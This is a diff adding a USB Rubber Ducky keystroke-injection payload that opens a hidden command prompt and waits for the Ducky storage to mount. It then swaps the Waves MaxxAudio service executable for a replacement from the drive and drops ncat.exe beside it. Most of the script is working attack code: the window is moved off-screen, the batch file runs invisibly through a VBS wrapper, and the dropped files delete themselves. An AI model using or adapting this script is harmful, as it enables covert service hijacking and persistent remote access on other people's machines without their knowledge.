@@ -1,0 +1,82 @@
+REM Name: copywave.txt
+REM Purpose: Wait for ducky mass storage to mount, then replace WavesSysSvc64.exe service file. 
+REM Encoder V2.4
+DEFAULT_DELAY 75
+DELAY 3000
+GUI r
+DELAY 1000
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 500
+ENTER
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 1
+ENTER
+
+REM Change directories because System32 appears to be protected. 
+STRING CD %TEMP%
+ENTER
+
+REM Make batch file that waits for SD card to mount. 
+REM Delete batch file if already exists
+STRING erase /Q GoatWait.bat
+ENTER
+STRING copy con GoatWait.bat
+ENTER
+REM GoatWait.bat
+STRING :while1
+ENTER
+STRING for /f %%a in ('wmic volume get driveletter^,label^| find "DUCKY"') do set myDrive=%%a\CopyFile\
+ENTER
+STRING if "%myDrive%"=="" (set mydrive=D:\CopyFile\
+STRING ) else (
+STRING echo Drive letter is %myDrive%)
+ENTER
+STRING if Exist %myDrive% (
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+REM Continue script.
+ENTER
+STRING rename "%programfiles%\Waves\MaxxAudio\WavesSysSvc64.exe" "WavesSysSvc64__.exe"
+ENTER
+STRING copy "%myDrive%WavesSysSvc64.exe" "%programfiles%\Waves\MaxxAudio\WavesSysSvc64.exe"
+ENTER
+STRING copy "%myDrive%ncat.exe" "%programfiles%\Waves\MaxxAudio\ncat.exe"
+ENTER
+STRING ECHO "This script will now self-destruct. Please ignore the next error message"
+ENTER
+STRING erase /Q invis.vbs
+ENTER
+STRING DEL "%~f0"
+ENTER
+CONTROL z
+ENTER
+
+REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
+REM Delete vbs file if already exists
+STRING erase /Q invis.vbs
+ENTER
+REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
+STRING copy con invis.vbs
+ENTER
+STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+ENTER
+CONTROL z
+ENTER
+
+REM RUN THE BATCH FILE
+STRING wscript.exe invis.vbs GoatWait.bat
+ENTER
+STRING EXIT
+ENTER
